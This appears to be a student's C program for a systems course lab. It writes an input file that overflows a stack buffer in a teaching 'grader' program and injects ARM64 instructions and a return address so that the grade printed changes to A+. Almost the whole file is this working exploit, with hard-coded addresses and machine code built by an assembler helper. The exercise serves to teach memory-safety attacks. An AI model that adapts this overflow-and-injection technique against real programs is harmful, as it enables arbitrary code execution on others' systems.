/*--------------------------------------------------------------------*/
/* createdataAplus.c                                                  */
/* Author: Jonah Johnson, Jeffrey Xu                                  */
/*--------------------------------------------------------------------*/
/*
  Produces a file called dataAplus with the student name, a nullbyte, 
  padding to overrun the stack, with the assembly code to overwrite
  the 'D' in data with a '+,' which causes the grade to be returned
  to be an A+ when combined with a prior branch-link instruction to
  printf the character A (followed by null bytes, as printf only takes
  strings as arguments).
*/

#include <stdio.h>
#include <stdint.h>
#include "miniassembler.h"


/* Writes a file 'dataAplus' to influence the grader program's behavior 
   and get an A+. No command-line arguments, stdin reads, or stdout/
   stderr writes. 
*/

int main(void)
{
    char* name = "Jonahjeff";

    int i;
    unsigned long ulAddr;
    unsigned int movInstr;
    unsigned int adrInstr;
    unsigned int strbInstr;
    unsigned int bInstr;
    
    /* open a file that will be written to in write binary mode */
    FILE *f = fopen("dataAplus", "w");

    /* return error if file can't be opened */
    if (!f) return 1; 

    /* write student name and nullbyte to file */
    fwrite(name, 1, 9, f);
    fputc('\0', f);

    /* writes padding to overrun the stack */
    for (i = 0; i < 10; i++) {
        fputc('0', f);
    }
    /* writes the A char to the file to be read by printf later*/
    fputc('A', f);
    /* null bytes to ensure this "string" is terminated. padding
    so that offset is a multiple of 4*/
    for (i = 0; i < 3; i++) {
        fputc('\0', f);
    }

    /* writes the instructions to print the 'A' char to file */
    movInstr = MiniAssembler_adr(0, 0x42006c, 0x420070);
    fwrite(&movInstr, sizeof(unsigned int), 1, f);
    bInstr = MiniAssembler_bl(0x400690, 0x420074);
    fwrite(&bInstr, sizeof(unsigned int), 1, f);

    /* writes the instructions to print what is in main to the file;
    similar structure as the createdataA program, except we are 
    replacingD in the data section with a +. The previous lines take
    care of the 'A' in the 'A+'. */
    movInstr = MiniAssembler_mov(0, '+');
    fwrite(&movInstr, sizeof(unsigned int), 1, f);
    adrInstr = MiniAssembler_adr(1, 0x420044, 0x42007c);
    fwrite(&adrInstr, sizeof(unsigned int), 1, f);
    strbInstr = MiniAssembler_strb(0, 1);
    fwrite(&strbInstr, sizeof(unsigned int), 1, f);
    bInstr = MiniAssembler_b(0x40089c, 0x420084);
    fwrite(&bInstr, sizeof(unsigned int), 1, f);

    
    /* writes address of instruction in main to get an A; see memmap */
    ulAddr = 0x420070;
    fwrite(&ulAddr, sizeof(unsigned long), 1, f);

    fclose(f);

    /* return success */
    return 0;
}